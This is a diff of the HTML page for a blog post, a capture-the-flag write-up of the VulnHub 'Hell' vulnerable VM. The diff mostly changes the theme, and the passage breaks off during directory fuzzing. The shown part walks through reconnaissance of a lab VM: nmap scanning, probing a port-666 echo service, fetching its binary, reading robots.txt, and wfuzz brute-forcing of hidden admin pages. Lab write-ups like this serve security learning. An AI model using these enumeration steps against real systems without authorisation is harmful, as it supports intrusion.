@@ -1,199 +1,168 @@
 <!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<html lang="en-us">
 <head>
-  <link href="http://gmpg.org/xfn/11" rel="profile">
-  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> Hell would just not freeze over! | #!/slash/note</title>
+  <meta name="description" content="[&#39;Caffeine fueled&#39;, &#39;(╯°□°)╯︵ ┻━┻&#39;, &#39;Security guy&#39;, &#39;Metalhead&#39;, &#39;I saw your password&#39;, &#39;KOOBo&#43;KXleKAv&#43;KXlSnjgaM=&#39;]">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="Hell would just not freeze over!" />
+<meta property="og:description" content="##foreword
+Lets start by saying that this is probably one of the toughest boot2root&rsquo;s I have tried thus far. Even though I have managed to get /root/flag.txt, I am yet to actually root this beast. I believe I have arguably come quite far and there is only one hurdle left, however, almost 3 days later I have learnt a TON of stuff, and am satisfied to start jotting the experience down. Obviously, should I finally get root, I&rsquo;ll update here and reflect. This is also a relatively long post as there were a ton of things to do. Give yourself some time if you plan on reading the whole post :)" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://leonjza.github.io/blog/2014/07/20/hell-would-just-not-freeze-over/" />
+<meta property="article:published_time" content="2014-07-20T19:00:46+00:00" />
+<meta property="article:modified_time" content="2014-07-20T19:00:46+00:00" />
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Hell would just not freeze over!"/>
+<meta name="twitter:description" content="##foreword
+Lets start by saying that this is probably one of the toughest boot2root&rsquo;s I have tried thus far. Even though I have managed to get /root/flag.txt, I am yet to actually root this beast. I believe I have arguably come quite far and there is only one hurdle left, however, almost 3 days later I have learnt a TON of stuff, and am satisfied to start jotting the experience down. Obviously, should I finally get root, I&rsquo;ll update here and reflect. This is also a relatively long post as there were a ton of things to do. Give yourself some time if you plan on reading the whole post :)"/>
 
   
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  
+  
+  <link rel="stylesheet" href="https://leonjza.github.io/css/style-white.css">
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
 
   
-  <script type="application/ld+json">
-{
-    "@context" : "http://schema.org",
-    "@type" : "BlogPosting",
-    "mainEntityOfPage": {
-         "@type": "WebPage",
-         "@id": "https:\/\/leonjza.github.io"
-    },
-    "articleSection" : "post",
-    "name" : "Hell would just not freeze over!",
-    "headline" : "Hell would just not freeze over!",
-    "description" : "\u003cp\u003e##foreword\nLets start by saying that this is probably one of the toughest boot2root\u0026rsquo;s I have tried thus far. Even though I have managed to get \u003ccode\u003e\/root\/flag.txt\u003c\/code\u003e, I am yet to actually \u003cem\u003eroot\u003c\/em\u003e this beast. I believe I have arguably come quite far and there is only one hurdle left, however, almost 3 days later I have learnt a \u003cstrong\u003eTON\u003c\/strong\u003e of stuff, and am satisfied to start jotting the experience down. Obviously, should I finally get \u003cstrong\u003eroot\u003c\/strong\u003e, I\u0026rsquo;ll update here and reflect. This is also a relatively long post as there were a ton of things to do. Give yourself some time if you plan on reading the whole post :)\u003c\/p\u003e",
-    "inLanguage" : "en-US",
-    "author" : "Leon Jacobs",
-    "creator" : "Leon Jacobs",
-    "publisher": "Leon Jacobs",
-    "accountablePerson" : "Leon Jacobs",
-    "copyrightHolder" : "Leon Jacobs",
-    "copyrightYear" : "2014",
-    "datePublished": "2014-07-20 19:00:46 \u002b0000 UTC",
-    "dateModified" : "2014-07-20 19:00:46 \u002b0000 UTC",
-    "url" : "https:\/\/leonjza.github.io\/blog\/2014\/07\/20\/hell-would-just-not-freeze-over\/",
-    "wordCount" : "6178",
-    "keywords" : [ "CTF","Vulnerable VM","Solution","Challenge","Blog" ]
+<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.png" />
+
+  
+  
+  
+  
+  
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-44457032-2', 'auto');
+	
+	ga('send', 'pageview');
 }
 </script>
-
-
-  <title>Hell would just not freeze over! &middot; </title>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
 
   
-  <link rel="stylesheet" href="https://leonjza.github.io/css/poole.css">
-  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde.css">
-  <link rel="stylesheet" href="https://leonjza.github.io/css/poole-overrides.css">
-  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde-overrides.css">
-  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde-x.css">
-  <link rel="stylesheet" href="https://leonjza.github.io/css/highlight/solarized_light.css">
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
-  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
-  
-
-  
-  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://leonjza.github.io/touch-icon-144-precomposed.png">
-  <link href="https://leonjza.github.io/favicon.png" rel="icon">
-
-  
-  
-  
-  
-
-  <meta name="description" content="">
-  <meta name="keywords" content="">
-  
-  <script>
-    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
-
-    ga('create', 'UA-44457032-2', 'auto');
-    ga('send', 'pageview');
-  </script>
   
 </head>
-<body class="theme-base-0d">
-<div class="sidebar">
-  <div class="container sidebar-sticky">
-    <div class="sidebar-about">
-      
-      <h1></h1>
-      <p class="lead">#!/slash/note<br>
-<em>A checkbox unchecker&rsquo;s notepad</em></p>
-    </div>
 
-    <ul class="sidebar-nav">
-      <li class="sidebar-nav-item"><a href="https://leonjza.github.io/">Blog</a></li>
-      
-      <li class="sidebar-nav-item"><a href="https://leonjza.github.io/post">Posts</a></li>
-      
-      <li class="sidebar-nav-item"><a href="https://leonjza.github.io/about/">About Me</a></li>
-      
-    </ul>
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
 
-    <ul class="sidebar-nav">
-      <li class="sidebar-nav-item">
-      <a href="https://github.com/leonjza"><i class="fa fa-github-square fa-3x"></i></a>
-      
-      
-      
-      
-      
-      <a href="https://twitter.com/leonjza"><i class="fa fa-twitter-square fa-3x"></i></a>
-      
-      
-      </li>
-    </ul>
-
-    
-
-    <p>Copyright &copy; 2020 <a href="https://leonjza.github.io/license/">License</a><br/>
-       Powered by <a href="http://gohugo.io">Hugo</a> and <a href="https://github.com/zyro/hyde-x">Hyde-X</a></p>
-
+    <header id="header">
+  <a href="https://leonjza.github.io">
+  
+    <div id="logo" style="background-image: url(https://leonjza.github.io/images/logo.png)"></div>
+  
+  <div id="title">
+    <h1>#!/slash/note</h1>
   </div>
-</div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
+      </li>
+      
+        <li><a href="https://leonjza.github.io/">Home</a></li>
+      
+        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
+      
+    </ul>
+  </div>
+</header>
 
 
-<div class="content container">
-  <div class="post">
-    <h1 class="post-title">Hell would just not freeze over!</h1>
-    <span class="post-date">Jul 20, 2014 &middot; 30 minute read &middot; <a href="https://leonjza.github.io/blog/2014/07/20/hell-would-just-not-freeze-over/#disqus_thread">Comments</a>
+
     
-    <br/>
-    <a class="label" href="https://leonjza.github.io/categories/ctf">CTF</a><a class="label" href="https://leonjza.github.io/categories/vulnerable-vm">Vulnerable VM</a><a class="label" href="https://leonjza.github.io/categories/solution">Solution</a><a class="label" href="https://leonjza.github.io/categories/challenge">Challenge</a>
-    </span>
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <div class="content" itemprop="articleBody">
+  
     <p>##foreword
 Lets start by saying that this is probably one of the toughest boot2root&rsquo;s I have tried thus far. Even though I have managed to get <code>/root/flag.txt</code>, I am yet to actually <em>root</em> this beast. I believe I have arguably come quite far and there is only one hurdle left, however, almost 3 days later I have learnt a <strong>TON</strong> of stuff, and am satisfied to start jotting the experience down. Obviously, should I finally get <strong>root</strong>, I&rsquo;ll update here and reflect. This is also a relatively long post as there were a ton of things to do. Give yourself some time if you plan on reading the whole post :)</p>
 <h2 id="welcome-to-hell">welcome to hell</h2>
 <p><a href="http://vulnhub.com/entry/hell-1,95/">Hell</a> is another vulnerable VM hosted at <a href="https://twitter.com/vulnhub">@VulnHub</a>. After recently completing the <a href="https://leonjza.github.io/blog/2014/07/17/climbing-the-skytower/">SkyTower</a> Vulnerable VM, I was feeling up to the challenge of a potentially more challenging VM. And boy, was it challenging&hellip; The wife was away on a <em>girls weekend out</em>, so I had plenty of time to sit and really think about things without distractions.</p>
 <h2 id="the-usual-first-steps">the usual first steps</h2>
 <p>So, like most other CTF type VM&rsquo;s, the natural first approach is to get the VM up and running, get the network connected and fire off a NMAP port scan to see what we got. I decided to use a Kali Linux VM to attack this vulnerableVM. The IP for the Hell VM was 192.168.56.102:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# nmap --reason 192.168.56.102
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# nmap --reason 192.168.56.102
 
-Starting Nmap 6.46 <span style="color:#f92672">(</span> http://nmap.org <span style="color:#f92672">)</span> at 2014-07-20 19:15 SAST
-Nmap scan report <span style="color:#66d9ef">for</span> 192.168.56.102
-Host is up, received reset <span style="color:#f92672">(</span>0.00025s latency<span style="color:#f92672">)</span>.
-Not shown: <span style="color:#ae81ff">996</span> filtered ports
-Reason: <span style="color:#ae81ff">996</span> no-responses
+Starting Nmap 6.46 <span style="color:#ff79c6">(</span> http://nmap.org <span style="color:#ff79c6">)</span> at 2014-07-20 19:15 SAST
+Nmap scan report <span style="color:#ff79c6">for</span> 192.168.56.102
+Host is up, received reset <span style="color:#ff79c6">(</span>0.00025s latency<span style="color:#ff79c6">)</span>.
+Not shown: <span style="color:#bd93f9">996</span> filtered ports
+Reason: <span style="color:#bd93f9">996</span> no-responses
 PORT    STATE SERVICE REASON
 22/tcp  open  ssh     syn-ack
 80/tcp  open  http    syn-ack
 111/tcp open  rpcbind syn-ack
 666/tcp open  doom    syn-ack
 
-Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 4.38 seconds
+Nmap <span style="color:#ff79c6">done</span>: <span style="color:#bd93f9">1</span> IP address <span style="color:#ff79c6">(</span><span style="color:#bd93f9">1</span> host up<span style="color:#ff79c6">)</span> scanned in 4.38 seconds
 </code></pre></div><p>So tcp/22, tcp/80 (kinda expected that), tcp/111 and then the first <em>whaaat</em> moment, tcp/666.</p>
 <h2 id="poking-around">poking around</h2>
 <p>The tcp/666 was the first unusual thing so I decided to check this out first. A telnet to 192.168.56.102 on port 666 resulted in:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# telnet 192.168.56.102 <span style="color:#ae81ff">666</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# telnet 192.168.56.102 <span style="color:#bd93f9">666</span>
 Trying 192.168.56.102...
 Connected to 192.168.56.102.
-Escape character is <span style="color:#e6db74">&#39;^]&#39;</span>.
+Escape character is <span style="color:#f1fa8c">&#39;^]&#39;</span>.
 
 Welcome to the Admin Panel
-Archiving latest version on webserver <span style="color:#f92672">(</span>echoserver.bak<span style="color:#f92672">)</span>...
-Starting echo server and monitoring...
+Archiving latest version on webserver <span style="color:#ff79c6">(</span>echoserver.bak<span style="color:#ff79c6">)</span>...
+Starting <span style="color:#8be9fd;font-style:italic">echo</span> server and monitoring...
 ping
 ping
 pong
 pong
-^<span style="color:#f92672">]</span>quit
+^<span style="color:#ff79c6">]</span>quit
 
 telnet&gt; quit
 Connection closed.
 </code></pre></div><p>The line <em>&lsquo;Archiving latest version on webserver (echoserver.bak)&hellip;'</em> hints towards the fact that we may be able to get this server software via the webserver. Other than that, the session appears to simply echo whatever I input. I toyed around with random inputs but the echoserver did not appear to be too upset about.</p>
 <h2 id="the-echo-server">the echo server</h2>
 <p>From the banner received with the service running on tcp/666, I browsed to the webserver root and made a request to <code>echoserver.bak</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# curl  <span style="color:#e6db74">&#34;http://192.168.56.102/echoserver.bak&#34;</span> &gt; echoserver.bak
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# curl  <span style="color:#f1fa8c">&#34;http://192.168.56.102/echoserver.bak&#34;</span> &gt; echoserver.bak
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
-<span style="color:#ae81ff">100</span>  <span style="color:#ae81ff">7846</span>  <span style="color:#ae81ff">100</span>  <span style="color:#ae81ff">7846</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>  1290k      <span style="color:#ae81ff">0</span> --:--:-- --:--:-- --:--:-- 1532k
+<span style="color:#bd93f9">100</span>  <span style="color:#bd93f9">7846</span>  <span style="color:#bd93f9">100</span>  <span style="color:#bd93f9">7846</span>    <span style="color:#bd93f9">0</span>     <span style="color:#bd93f9">0</span>  1290k      <span style="color:#bd93f9">0</span> --:--:-- --:--:-- --:--:-- 1532k
 root@kali:~# file echoserver.bak
-echoserver.bak: ELF 64-bit LSB executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked <span style="color:#f92672">(</span>uses shared libs<span style="color:#f92672">)</span>, <span style="color:#66d9ef">for</span> GNU/Linux 2.6.26, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>0xccc6d0e8b14d50e98b07025d5eb9e496a22a8e10, not stripped
+echoserver.bak: ELF 64-bit LSB executable, x86-64, version <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">(</span>SYSV<span style="color:#ff79c6">)</span>, dynamically linked <span style="color:#ff79c6">(</span>uses shared libs<span style="color:#ff79c6">)</span>, <span style="color:#ff79c6">for</span> GNU/Linux 2.6.26, BuildID<span style="color:#ff79c6">[</span>sha1<span style="color:#ff79c6">]=</span>0xccc6d0e8b14d50e98b07025d5eb9e496a22a8e10, not stripped
 </code></pre></div><p>Now I will admit, this file kept me busy for a very long time. One would try something, google something, try something, goole something, just to get sucked in and lost in a never ending tunnel of binary exploitation &amp; analysis.
 To sum up, one would start the echo server up locally, which opens a socket on tcp/666. I&rsquo;d then telnet to 127.0.0.1:666 and fuzz. Running the echoserver with a <code>strace</code>, one will notice the server &lsquo;dying&rsquo; when a socket is closed:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bind<span style="color:#f92672">(</span>3, <span style="color:#f92672">{</span>sa_family<span style="color:#f92672">=</span>AF_INET, sin_port<span style="color:#f92672">=</span>htons<span style="color:#f92672">(</span>666<span style="color:#f92672">)</span>, sin_addr<span style="color:#f92672">=</span>inet_addr<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;0.0.0.0&#34;</span><span style="color:#f92672">)}</span>, 16<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-listen<span style="color:#f92672">(</span>3, 10<span style="color:#f92672">)</span>                           <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-accept<span style="color:#f92672">(</span>3, 0, NULL<span style="color:#f92672">)</span>                      <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>
-read<span style="color:#f92672">(</span>4, <span style="color:#e6db74">&#34;test\r\n&#34;</span>, 2000<span style="color:#f92672">)</span>               <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>
-write<span style="color:#f92672">(</span>4, <span style="color:#e6db74">&#34;test\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#34;</span>..., 1500<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1500</span>
-read<span style="color:#f92672">(</span>4, <span style="color:#e6db74">&#34;&#34;</span>, 2000<span style="color:#f92672">)</span>                       <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-write<span style="color:#f92672">(</span>4, <span style="color:#e6db74">&#34;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#34;</span>..., 1500<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1500</span>
-read<span style="color:#f92672">(</span>4, <span style="color:#e6db74">&#34;&#34;</span>, 2000<span style="color:#f92672">)</span>                       <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-write<span style="color:#f92672">(</span>4, <span style="color:#e6db74">&#34;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#34;</span>..., 1500<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> -1 EPIPE <span style="color:#f92672">(</span>Broken pipe<span style="color:#f92672">)</span>
---- SIGPIPE <span style="color:#f92672">(</span>Broken pipe<span style="color:#f92672">)</span> @ <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> ---
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bind<span style="color:#ff79c6">(</span>3, <span style="color:#ff79c6">{</span><span style="color:#8be9fd;font-style:italic">sa_family</span><span style="color:#ff79c6">=</span>AF_INET, <span style="color:#8be9fd;font-style:italic">sin_port</span><span style="color:#ff79c6">=</span>htons<span style="color:#ff79c6">(</span>666<span style="color:#ff79c6">)</span>, <span style="color:#8be9fd;font-style:italic">sin_addr</span><span style="color:#ff79c6">=</span>inet_addr<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;0.0.0.0&#34;</span><span style="color:#ff79c6">)}</span>, 16<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+listen<span style="color:#ff79c6">(</span>3, 10<span style="color:#ff79c6">)</span>                           <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+accept<span style="color:#ff79c6">(</span>3, 0, NULL<span style="color:#ff79c6">)</span>                      <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">4</span>
+read<span style="color:#ff79c6">(</span>4, <span style="color:#f1fa8c">&#34;test\r\n&#34;</span>, 2000<span style="color:#ff79c6">)</span>               <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">6</span>
+write<span style="color:#ff79c6">(</span>4, <span style="color:#f1fa8c">&#34;test\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#34;</span>..., 1500<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1500</span>
+read<span style="color:#ff79c6">(</span>4, <span style="color:#f1fa8c">&#34;&#34;</span>, 2000<span style="color:#ff79c6">)</span>                       <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+write<span style="color:#ff79c6">(</span>4, <span style="color:#f1fa8c">&#34;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#34;</span>..., 1500<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1500</span>
+read<span style="color:#ff79c6">(</span>4, <span style="color:#f1fa8c">&#34;&#34;</span>, 2000<span style="color:#ff79c6">)</span>                       <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+write<span style="color:#ff79c6">(</span>4, <span style="color:#f1fa8c">&#34;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#34;</span>..., 1500<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">=</span> -1 EPIPE <span style="color:#ff79c6">(</span>Broken pipe<span style="color:#ff79c6">)</span>
+--- SIGPIPE <span style="color:#ff79c6">(</span>Broken pipe<span style="color:#ff79c6">)</span> @ <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">(</span>0<span style="color:#ff79c6">)</span> ---
 +++ killed by SIGPIPE +++
 </code></pre></div><p>Eventually I decided to leave the echoserver alone and move on to the web server.</p>
 <h2 id="the-web-server">the web server</h2>
 <p>Web hacking is generally more familiar for me. Initially the web server did not reveal anything interesting. That is until you view the <code>robots.txt</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# curl http://192.168.56.102/robots.txt
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# curl http://192.168.56.102/robots.txt
 User-agent: *
 Disallow: /personal/
 Disallow: /super_secret_login_path_muhahaha/
 </code></pre></div><p>The folder <code>personal/</code> had a g0tmi1lk (founder of VulnHub) fansite detailing that it is being built by Jack and will be live soon. Other than that, nothing particularly interesting. <code>super_secret_login_path_muhahaha</code> however, presented us with a login portal with a title <strong>Admin</strong>.</p>
 <p>The login form posted to <code>login.php</code>, and on failure would 302 to: <code>http://192.168.56.102/super_secret_login_path_muhahaha/index.php?the_user_is_a_failure=1</code>. Fuzzing <code>the_user_is_a_failure</code> simply appeared to flip the Login Failed message. Manual and automated test with sqlmap also failed. Sooo, it was time to enumerate some more.</p>
 <p>The next move was to fuzz more directories and maybe some interesting files. I decided on <code>wfuzz</code> for this. I used the medium wordlist for the sake of time, and tried for some folders and files in both the known and unknown directories:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt --hc <span style="color:#ae81ff">404</span> http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt --hc <span style="color:#bd93f9">404</span> http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ
 
 ********************************************************
 * Wfuzz  2.0 - The Web Bruteforcer                     *
@@ -202,15 +171,15 @@ Disallow: /super_secret_login_path_muhahaha/
 Target: http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ
 Payload type: file,/usr/share/wordlists/wfuzz/general/big.txt
 
-Total requests: 3036
-<span style="color:#f92672">==================================================================</span>
-ID Response   Lines      Word         Chars          Request
-<span style="color:#f92672">==================================================================</span>
+Total requests: <span style="color:#8be9fd;font-style:italic">3036</span>
+<span style="color:#ff79c6">==================================================================</span>
+ID Response   Lines      Word         Chars          <span style="color:#8be9fd;font-style:italic">Request</span>
+<span style="color:#ff79c6">==================================================================</span>
 
-00013:  C<span style="color:#f92672">=</span><span style="color:#ae81ff">200</span>      <span style="color:#ae81ff">7</span> L        <span style="color:#ae81ff">11</span> W       <span style="color:#ae81ff">88</span> Ch    <span style="color:#e6db74">&#34; - 1&#34;</span>
-02780:  C<span style="color:#f92672">=</span><span style="color:#ae81ff">200</span>   <span style="color:#ae81ff">5606</span> L     <span style="color:#ae81ff">35201</span> W    <span style="color:#ae81ff">1028165</span> Ch     <span style="color:#e6db74">&#34; - server&#34;</span>
+00013:  <span style="color:#8be9fd;font-style:italic">C</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">200</span>      <span style="color:#bd93f9">7</span> L        <span style="color:#bd93f9">11</span> W       <span style="color:#bd93f9">88</span> Ch    <span style="color:#f1fa8c">&#34; - 1&#34;</span>
+02780:  <span style="color:#8be9fd;font-style:italic">C</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">200</span>   <span style="color:#bd93f9">5606</span> L     <span style="color:#bd93f9">35201</span> W    <span style="color:#bd93f9">1028165</span> Ch     <span style="color:#f1fa8c">&#34; - server&#34;</span>
 </code></pre></div><p>Adding <code>.php</code> to the end of my fuzz keyword revealed some more interesting files:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt --hc <span style="color:#ae81ff">404</span> http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ.php
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt --hc <span style="color:#bd93f9">404</span> http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ.php
 
 ********************************************************
 * Wfuzz  2.0 - The Web Bruteforcer                     *
@@ -219,18 +188,18 @@ ID Response   Lines      Word         Chars          Request
 Target: http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ.php
 Payload type: file,/usr/share/wordlists/wfuzz/general/big.txt
 
-Total requests: 3036
-<span style="color:#f92672">==================================================================</span>
-ID Response   Lines      Word         Chars          Request
-<span style="color:#f92672">==================================================================</span>
+Total requests: <span style="color:#8be9fd;font-style:italic">3036</span>
+<span style="color:#ff79c6">==================================================================</span>
+ID Response   Lines      Word         Chars          <span style="color:#8be9fd;font-style:italic">Request</span>
+<span style="color:#ff79c6">==================================================================</span>
 
-01375:  C<span style="color:#f92672">=</span><span style="color:#ae81ff">200</span>     <span style="color:#ae81ff">17</span> L        <span style="color:#ae81ff">33</span> W      <span style="color:#ae81ff">371</span> Ch    <span style="color:#e6db74">&#34; - index&#34;</span>
-01663:  C<span style="color:#f92672">=</span><span style="color:#ae81ff">302</span>      <span style="color:#ae81ff">0</span> L         <span style="color:#ae81ff">0</span> W        <span style="color:#ae81ff">0</span> Ch    <span style="color:#e6db74">&#34; - login&#34;</span>
-01684:  C<span style="color:#f92672">=</span><span style="color:#ae81ff">200</span>      <span style="color:#ae81ff">5</span> L        <span style="color:#ae81ff">19</span> W      <span style="color:#ae81ff">163</span> Ch    <span style="color:#e6db74">&#34; - mail&#34;</span>
-02009:  C<span style="color:#f92672">=</span><span style="color:#ae81ff">302</span>     <span style="color:#ae81ff">21</span> L        <span style="color:#ae81ff">38</span> W      <span style="color:#ae81ff">566</span> Ch    <span style="color:#e6db74">&#34; - panel&#34;</span>
-02076:  C<span style="color:#f92672">=</span><span style="color:#ae81ff">302</span>     <span style="color:#ae81ff">17</span> L        <span style="color:#ae81ff">35</span> W      <span style="color:#ae81ff">387</span> Ch    <span style="color:#e6db74">&#34; - personal&#34;</span>
-02439:  C<span style="color:#f92672">=</span><span style="color:#ae81ff">200</span>      <span style="color:#ae81ff">7</span> L        <span style="color:#ae81ff">21</span> W      <span style="color:#ae81ff">170</span> Ch    <span style="color:#e6db74">&#34; - server&#34;</span>
-02852:  C<span style="color:#f92672">=</span><span style="color:#ae81ff">200</span>      <span style="color:#ae81ff">2</span> L         <span style="color:#ae81ff">2</span> W       <span style="color:#ae81ff">19</span> Ch    <span style="color:#e6db74">&#34; - users&#34;</span>
+01375:  <span style="color:#8be9fd;font-style:italic">C</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">200</span>     <span style="color:#bd93f9">17</span> L        <span style="color:#bd93f9">33</span> W      <span style="color:#bd93f9">371</span> Ch    <span style="color:#f1fa8c">&#34; - index&#34;</span>
+01663:  <span style="color:#8be9fd;font-style:italic">C</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">302</span>      <span style="color:#bd93f9">0</span> L         <span style="color:#bd93f9">0</span> W        <span style="color:#bd93f9">0</span> Ch    <span style="color:#f1fa8c">&#34; - login&#34;</span>
+01684:  <span style="color:#8be9fd;font-style:italic">C</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">200</span>      <span style="color:#bd93f9">5</span> L        <span style="color:#bd93f9">19</span> W      <span style="color:#bd93f9">163</span> Ch    <span style="color:#f1fa8c">&#34; - mail&#34;</span>
